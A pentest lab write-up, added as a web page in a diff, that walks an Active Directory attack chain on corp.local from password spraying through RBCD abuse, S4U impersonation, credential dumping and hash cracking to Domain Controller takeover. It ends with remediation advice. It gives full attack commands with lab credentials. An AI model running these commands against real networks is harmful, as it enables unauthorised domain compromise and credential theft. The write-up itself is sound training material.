@@ -1,0 +1,512 @@
+---
+import Writeup from "../../layouts/Writeup.astro";
+
+const img = "/writeups/rbcd";
+---
+
+<Writeup
+  title="AD Pentest — RBCD to Domain Admin"
+  description="Full Active Directory attack chain from zero credentials to Domain Admin via Resource-Based Constrained Delegation abuse. No CVE, no software exploit — just misconfigured permissions."
+  date="2026-04-27"
+  tags={["Active Directory", "RBCD", "BloodHound", "Kerberos", "Pentest Lab"]}
+  slug="rbcd"
+>
+  <Fragment slot="title">
+    From <span class="text-[var(--color-accent)]">Zero Creds</span> to Domain Admin
+    via RBCD
+  </Fragment>
+
+  <!-- ═══ LAB ENVIRONMENT ═══ -->
+  <h2>Lab Environment</h2>
+
+  <table>
+    <thead><tr><th>Component</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Domain</td><td>corp.local</td></tr>
+      <tr><td>Domain Controller</td><td>192.168.1.10 (DC)</td></tr>
+      <tr><td>Target Workstation</td><td>192.168.1.20 (WS01)</td></tr>
+      <tr><td>Target User</td><td>zouhair</td></tr>
+      <tr><td>OS</td><td>Windows Server 2022 Build 20348 x64</td></tr>
+      <tr><td>Attacker</td><td>Kali Linux</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-warn">
+    <strong> LAB SETUP</strong>
+    Two intentional misconfigurations were applied: (1) <code>zouhair</code> was granted
+    <code>GenericWrite</code> over the WS01 computer object, and (2) the AD structure
+    includes an IT group with delegated rights over workstations — a realistic shortcut
+    common in real environments.
+  </div>
+
+  <figure>
+    <img src={`${img}/ad-users.png`} alt="AD Users" loading="lazy" /><figcaption
+    >
+      AD Users — zouhair account in the domain
+    </figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-computers.png`}
+      alt="AD Computers"
+      loading="lazy"
+    /><figcaption>AD Computers — WS01 visible in domain</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-employees.png`}
+      alt="AD Employees"
+      loading="lazy"
+    /><figcaption>AD Employees OU structure</figcaption>
+  </figure>
+
+  <!-- ═══ PHASE 1: RECONNAISSANCE ═══ -->
+  <h2>Phase 1 — Reconnaissance</h2>
+
+  <p>
+    Starting with a blank slate no credentials, no knowledge of the environment.
+    The first step is discovering what's on the network and identifying the
+    Domain Controller.
+  </p>
+
+  <h3>Network Discovery</h3>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmt"># SYN scan to identify live hosts and open ports</span>
+<span class="cmd">nmap</span> <span class="arg">-sS</span> 192.168.1.0/24</pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-recon-identify-hosts.png`}
+      alt="Nmap scan"
+      loading="lazy"
+    /><figcaption>
+      nmap SYN scan — DC and WS01 identified on the network
+    </figcaption>
+  </figure>
+
+  <p>
+    The scan reveals two live hosts. <strong>192.168.1.10</strong> exposes ports 88,
+    389, 445, 3268 a classic AD Domain Controller fingerprint. <strong
+      >192.168.1.20</strong
+    > is WS01.
+  </p>
+
+  <h3>User Enumeration via Kerberos</h3>
+
+  <p>
+    Using the nmap <code>krb5-enum-users</code> script, we probe the DC's Kerberos
+    port to enumerate valid domain accounts without any credentials.
+  </p>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmt"># Probe Kerberos for valid usernames</span>
+<span class="cmd">nmap</span> <span class="arg">-p 88</span> --script=krb5-enum-users --script-args krb5-enum-users.realm=corp.local,userdb=/usr/share/seclists/Username/Names/names.txt 192.168.1.10</pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-recon-users.png`}
+      alt="User enumeration"
+      loading="lazy"
+    /><figcaption>
+      krb5-enum-users — valid Kerberos principals discovered
+    </figcaption>
+  </figure>
+
+  <div class="callout callout-info">
+    <strong>HOW IT WORKS</strong>
+    Kerbrute sends AS-REQ packets to the DC. A valid user triggers <code
+      >KDC_ERR_PREAUTH_REQUIRED</code
+    >, while an invalid one returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. No
+    lockout risk, no credentials needed.
+  </div>
+
+  <!-- ═══ PHASE 2: PASSWORD SPRAYING ═══ -->
+  <h2>Phase 2 — Password Spraying</h2>
+
+  <p>
+    With a valid username list, we spray common passwords against SMB. Spraying
+    one password at a time to avoid lockout.
+  </p>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">netexec</span> smb 192.168.1.10 <span class="arg">-u</span> users.txt <span class="arg">-p</span> /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt --continue-on-success</pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-password-spraying-1.png`}
+      alt="Password spraying"
+      loading="lazy"
+    /><figcaption>Password spraying in progress</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-password-spraying-2.png`}
+      alt="Password found"
+      loading="lazy"
+    /><figcaption>[+] Hit — corp.local\zouhair:Password123</figcaption>
+  </figure>
+
+  <div class="callout callout-success">
+    <strong> CREDENTIALS OBTAINED</strong>
+    <code>corp.local\zouhair : Password123</code>
+  </div>
+
+  <h3>Validate on WS01</h3>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">netexec</span> smb 192.168.1.20 <span class="arg">-u</span> zouhair <span class="arg">-p</span> <span class="str">'Password123'</span></pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-test-password.png`}
+      alt="WS01 auth"
+      loading="lazy"
+    /><figcaption>zouhair authenticates — [+] but no (Pwn3d!)</figcaption>
+  </figure>
+
+  <p>
+    The account authenticates but has no administrative access to WS01. This is
+    where privilege escalation begins.
+  </p>
+
+  <!-- ═══ PHASE 3: BLOODHOUND ═══ -->
+  <h2>Phase 3 — BloodHound Enumeration</h2>
+
+  <p>
+    With valid credentials, we collect the entire AD graph using BloodHound.
+    This reveals relationships, permissions, and attack paths invisible to
+    normal enumeration.
+  </p>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">bloodhound-python</span> <span class="arg">-u</span> zouhair <span class="arg">-p</span> <span class="str">'Password123'</span> <span class="arg">-d</span> corp.local <span class="arg">-ns</span> 192.168.1.10  <span class="arg">-c</span> All --zip</pre>
+  </div>
+  <figure>
+    <img
+      src={`${img}/ad-enumeration-bloodhound.png`}
+      alt="Full graph"
+      loading="lazy"
+    /><figcaption>BloodHound — full AD enumeration graph</figcaption>
+  </figure>
+  <h3>Critical Finding — GenericWrite on WS01</h3>
+
+  <figure>
+    <img
+      src={`${img}/ad-bloodhound-gui.png`}
+      alt="BloodHound"
+      loading="lazy"
+    /><figcaption>BloodHound GUI — Uploading the ZIP file</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-bloodhound-object-info.png`}
+      alt="Object info"
+      loading="lazy"
+    /><figcaption>WS01 object information</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-bloodhound-outbound-control-genericwrite.png`}
+      alt="GenericWrite"
+      loading="lazy"
+    /><figcaption>
+      Outbound control — zouhair has GenericWrite over WS01
+    </figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-bloodhound-inbound.png`}
+      alt="Inbound control"
+      loading="lazy"
+    /><figcaption>Inbound control rights on WS01</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-bloodhound-user-membership.png`}
+      alt="User membership"
+      loading="lazy"
+    /><figcaption>zouhair's group membership — member of IT group</figcaption>
+  </figure>
+  <p>
+    After uploading the ZIP file, it is time to analyze what we can do with the
+    user and to define a path to compromise the entire domain. From the
+    screenshots, we notice that the user ZOUHAIR@CORP.LOCAL is a member of the
+    Domain Users group and the IT group. The user has <code>GenericWrite</code> over
+    <code>WS01.CORP.LOCAL</code>, inherited through IT group membership. This
+    allows writing to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute,
+    which leads to an RBCD attack.
+  </p>
+
+  <!-- ═══ PHASE 4: RBCD SETUP ═══ -->
+  <h2>Phase 4 — RBCD Attack Setup</h2>
+
+  <p>
+    Resource-Based Constrained Delegation (RBCD) allows a computer object to
+    specify which accounts can impersonate users to it. Since <code
+      >zouhair</code
+    > has <code>GenericWrite</code> over WS01, we can write this attribute ourselves.
+  </p>
+
+  <h3>Create a Controlled Machine Account</h3>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">impacket-addcomputer</span> corp.local/zouhair:<span class="str">'Password123'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-computer-name</span> <span class="str">'ZXGR$'</span> <span class="arg">-computer-pass</span> <span class="str">'Active@123!'</span></pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-addingcomputer-impacket.png`}
+      alt="Machine account"
+      loading="lazy"
+    /><figcaption>ZXGR$ machine account created successfully</figcaption>
+  </figure>
+
+  <h3>Write RBCD Delegation Attribute</h3>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">impacket-rbcd</span> corp.local/zouhair:<span class="str">'Password123'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-action</span> write <span class="arg">-delegate-to</span> <span class="str">'WS01$'</span> <span class="arg">-delegate-from</span> <span class="str">'ZXGR$'</span></pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-delegate-write.png`}
+      alt="RBCD write"
+      loading="lazy"
+    /><figcaption>RBCD write — delegation rights modified on WS01</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-delegate-verification.png`}
+      alt="RBCD verify"
+      loading="lazy"
+    /><figcaption>RBCD read — ZXGR$ confirmed in delegation list</figcaption>
+  </figure>
+
+  <div class="callout callout-info">
+    <strong> WHAT HAPPENED</strong>
+    WS01's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> now includes <code
+      >ZXGR$</code
+    >. This instructs the KDC: <em
+      >"trust ZXGR$ to impersonate any user to this machine"</em
+    >.
+  </div>
+
+  <!-- ═══ PHASE 5: S4U ═══ -->
+  <h2>Phase 5 — Kerberos Impersonation (S4U)</h2>
+
+  <p>
+    This phase involves using S4U2Self and S4U2Proxy. We request a service
+    ticket for <code>cifs/WS01</code> while impersonating <code
+      >Administrator</code
+    >, without ever knowing the Administrator's password.
+  </p>
+  <p>
+    Then we use the cached ticket to authenticate to the machine as
+    Administrator.
+  </p>
+
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">impacket-getST</span> corp.local/<span class="str">'ZXGR$'</span>:<span class="str">'Active@123!'</span> <span class="arg">-dc-ip</span> 192.168.1.10 <span class="arg">-spn</span> cifs/WS01.corp.local <span class="arg">-impersonate</span> Administrator
+
+<span class="cmd">export</span> KRB5CCNAME=Administrator@cifs_WS01.corp.local@CORP.LOCAL.ccache
+<span class="cmd">impacket-wmiexec</span> <span class="arg">-k -no-pass</span> Administrator@WS01.corp.local</pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-impersonate-admin-s4u.png`}
+      alt="S4U"
+      loading="lazy"
+    /><figcaption>
+      S4U impersonation — forged service ticket for Administrator
+    </figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-export-ccache-file.png`}
+      alt="ccache"
+      loading="lazy"
+    /><figcaption>Exporting Kerberos ccache file</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-ws01-compromised.png`}
+      alt="WS01 shell"
+      loading="lazy"
+    /><figcaption>Administrator shell obtained on WS01</figcaption>
+  </figure>
+
+  <!-- ═══ PHASE 6: CREDENTIAL DUMPING ═══ -->
+  <h2>Phase 6 — Credential Dumping</h2>
+  <p>
+    In this phase, after obtaining a valid ticket, we leverage it to access the
+    workstation and dump cached credentials using <code>impacket</code>. The
+    goal is to extract NTLM/DCC2 hashes without requiring plaintext passwords.
+    Once the hashes are collected, we perform offline cracking using <code
+      >hashcat</code
+    > with a wordlist. This step allows us to recover weak credentials, in this case
+    leading to the Administrator password, which gives us full control over the machine
+    and moves us closer to compromising the domain.
+  </p>
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre><span class="cmd">impacket-secretsdump</span> <span class="arg">-k -no-pass</span> WS01.corp.local
+
+<span class="cmt"># Crack DCC2 hash</span>
+<span class="cmd">hashcat</span> <span class="arg">-m 2100 -a 0</span> admin_hash /usr/share/seclists/Passwords/corporate_passwords.txt --force</pre>
+  </div>
+
+  <figure>
+    <img
+      src={`${img}/ad-dumping-hashes.png`}
+      alt="Dumping hashes"
+      loading="lazy"
+    /><figcaption>Dumping cached credentials from WS01</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-cracking-hash.png`}
+      alt="Cracking"
+      loading="lazy"
+    /><figcaption>Hashcat cracking DCC2 hash offline</figcaption>
+  </figure>
+  <figure>
+    <img
+      src={`${img}/ad-cracked-hash.png`}
+      alt="Cracked"
+      loading="lazy"
+    /><figcaption>Hash cracked — Administrator password recovered</figcaption>
+  </figure>
+
+  <div class="callout callout-success">
+    <strong> ADMINISTRATOR PASSWORD</strong>
+    <code>P@ssw0rd123!</code> recovered via offline dictionary attack.
+  </div>
+
+  <!-- ═══ PHASE 7: DC COMPROMISE ═══ -->
+  <h2>Phase 7 — Domain Controller Compromise</h2>
+  <p>
+    In this phase, using the recovered Administrator credentials, we directly
+    authenticate to the Domain Controller via <code>evil-winrm</code>. At this
+    point, we have full administrative access over the domain. From there, we
+    perform a DCSync attack to dump all domain hashes, including the <code
+      >krbtgt</code
+    > account. This effectively means the domain is fully compromised, and we can
+    forge Golden Tickets for persistent and unrestricted access.
+  </p>
+  <div class="code-block">
+    <div class="code-bar">
+      <div class="code-dots"><span></span><span></span><span></span></div>
+      <span class="code-label">bash</span>
+    </div>
+    <pre>
+<span class="cmd">evil-winrm</span> <span class="arg">-i</span> 192.168.1.10 <span class="arg">-u</span> Administrator <span class="arg">-p</span> <span class="str">'P@ssw0rd123!'</span></pre>
+  </div>
+
+  <figure>
+    <img src={`${img}/ad-proof-dc.png`} alt="Proof" loading="lazy" /><figcaption
+    >
+      Proof of Domain Controller compromise
+    </figcaption>
+  </figure>
+  <figure>
+    <img src={`${img}/ad-pwnd.png`} alt="Pwned" loading="lazy" /><figcaption>
+      Domain fully compromised — all hashes obtained
+    </figcaption>
+  </figure>
+
+  <hr />
+
+  <!-- ═══ CONCLUSION ═══ -->
+  <h2 id="conclusion">Recommendations & Takeaways</h2>
+
+  <p>
+    This lab demonstrates that <strong>a single misconfiguration</strong> can cascade
+    into a <strong>full domain compromise</strong>.
+  </p>
+
+  <table>
+    <thead><tr><th>Vulnerability</th><th>Remediation</th></tr></thead>
+    <tbody>
+      <tr
+        ><td>GenericWrite on computer objects</td><td
+          >Audit and remove excessive ACLs. Apply least privilege.</td
+        ></tr
+      >
+      <tr
+        ><td>Weak password (Password123)</td><td
+          >Enforce password complexity. Minimum 12 chars, lockout after 5
+          attempts.</td
+        ></tr
+      >
+      <tr
+        ><td>Machine Account Quota = 10</td><td
+          >Set ms-DS-MachineAccountQuota to 0 for standard users.</td
+        ></tr
+      >
+      <tr
+        ><td>RBCD abuse</td><td
+          >Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity in SIEM.</td
+        ></tr
+      >
+      <tr
+        ><td>DCC2 crackable offline</td><td
+          >Limit cached logons. Use Protected Users group for admin accounts.</td
+        ></tr
+      >
+      <tr
+        ><td>No detection</td><td
+          >Deploy Microsoft Defender for Identity (MDI).</td
+        ></tr
+      >
+    </tbody>
+  </table>
+
+  <div class="callout callout-warn">
+    <strong>KEY INSIGHT</strong>
+    This entire chain exploits <em>no software vulnerability</em>. Every step
+    abused a misconfigured permission or a weak password. <strong
+      >Active Directory security is configuration security.</strong
+    >
+  </div>
+</Writeup>
